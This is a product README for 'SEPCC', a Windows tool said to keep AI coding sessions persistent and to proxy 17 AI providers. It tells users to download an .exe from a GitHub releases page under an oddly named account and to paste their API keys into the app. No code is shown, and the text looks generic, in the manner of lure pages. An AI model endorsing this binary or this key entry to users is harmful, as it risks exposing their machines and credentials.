# 🤖 SEPCC - Keep your AI coding sessions alive

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/expurgatoramphibolegroup853/SEPCC/releases)

SEPCC helps you code with AI without losing your work. This tool acts as a bridge between your computer and AI coding models. It remembers your progress even if you close your computer or restart your session. You can switch between many different AI providers easily.

## 📥 Getting the software

You must visit the project page to download the latest version for your system.

[Download the latest version here](https://github.com/expurgatoramphibolegroup853/SEPCC/releases)

Look for the file that ends in .exe under the Assets section. Save this file to your computer.

## 🖥️ System requirements

Your computer needs to meet these basic standards to run SEPCC smoothly:

* Windows 10 or later.
* At least 4GB of RAM. A computer with 8GB or more works better.
* An active internet connection.
* An account with an AI service provider like OpenRouter, Anthropic, or DeepSeek.

## ⚙️ How to install

Follow these steps to set up the application on your computer:

1. Locate the file you downloaded in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts on your screen.
4. Click Finish when the installer completes the process.
5. Find the SEPCC icon on your desktop or in your Start menu. Click it to open the application.

## 🚀 Setting up the proxy

The software needs to talk to an AI service to help you write code. You must enter your credentials so the app can connect.

1. Open the settings menu inside the application.
2. Select your preferred AI provider from the list.
3. Paste your API key into the box. You get this key from the website of your chosen AI provider.
4. Save your changes. The indicator light should turn green to show that the connection is active.

## 📖 Using the application

The main window shows your active coding session. Because SEPCC uses a persistent context, it keeps track of the files you edit and the questions you ask.

* Start a new session by clicking the New Session button.
* If you restart the app, it automatically restores your last session.
* Use the sidebar to see the history of your previous coding tasks.
* If the answer from the AI does not feel right, you can switch the provider in the settings. This allows you to test results from different models without losing your current progress.

## 🛠️ Troubleshooting common issues

If you face problems, check these items first:

* Connection errors: Check if your API key is correct. Sometimes a key expires. If you suspect your key stopped working, generate a new one on your provider portal.
* Slow performance: Close other browser tabs or heavy programs while using the app.
* Application crash: Restart the application. SEPCC is designed to recover your session state immediately after it reopens.
* Missing history: Ensure you are logged into the account you used when you started the session.

## 🛡️ Privacy and your data

Your code and instructions stay in your hands. SEPCC manages the communication between your machine and the AI models. It does not store your code on a remote server. The session data sits locally on your hard drive. This ensures you keep control over your intellectual property.

## 🧩 Managing sessions

One core feature of this tool is its ability to resume work. When you shut down your machine at night, you lose your place in many terminal-based coding tools. SEPCC saves your session state to a local file. When you open the program the next morning, it loads the files, the recent history, and the instructions you gave the AI previously. This saves time and prevents you from explaining the rules of your project to the AI again.

## 💡 Choosing an AI provider

The tool connects to 17 different AI providers. You can choose the one that fits your budget or accuracy needs. Some users prefer premium models for complex logic, while others prefer faster models for simple tasks. By using this proxy, you can swap between these models without changing your workflow.
